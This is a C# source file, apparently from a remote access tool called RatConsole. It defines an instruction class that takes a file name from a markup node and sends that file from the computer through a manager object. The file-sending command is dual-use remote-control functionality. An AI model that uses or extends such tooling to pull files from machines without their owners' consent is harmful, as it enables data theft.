using System;

using Bau.Libraries.LibCommonHelper.Extensors;
using Bau.Libraries.LibMarkupLanguage;

namespace RatConsole.Domain
{
	/// <summary>
	///		Instrucción para listar los archivos del ordenador
	/// </summary>
	public class SendFilesInstructionModel : BaseInstructionModel
	{
		// Constantes públicas
		public const string TagRoot = "SendFile";

		public SendFilesInstructionModel(Controllers.ProgramManager manager) : base(manager) {}

		/// <summary>
		///		Interpreta el nodo
		/// </summary>
		public override BaseInstructionModel Parse(MLNode nodeML)
		{
			// Interpreta los datos básicos
			ParseInternal(nodeML);
			FileName = nodeML.Value.TrimIgnoreNull();
			// Devuelve la instrucción interpretada
			return this;
		}

		/// <summary>
		///		Ejecuta la instrucción
		/// </summary>
		protected override void ExecuteInternal()
		{
			// Log
			Manager.Log($"Enviando el archivo ...");
			// Ejecuta la instrucción
			if (System.IO.File.Exists(FileName))
				Manager.SendFile(FileName);
			// Log
			Manager.Log($"Fin del envío de archivos");
		}

		/// <summary>
		///		Obtiene los datos del nodo
		/// </summary>
		public override MLNode GetMLNode()
		{
			MLNode rootML = GetMLNodeInternal(TagRoot);

				// Añade los parámetros
				rootML.Value = FileName;
				// Devuelve el nodo
				return rootML;
		}

		/// <summary>
		///		Nombre de archivo
		/// </summary>
		private string FileName { get; set; }
	}
}
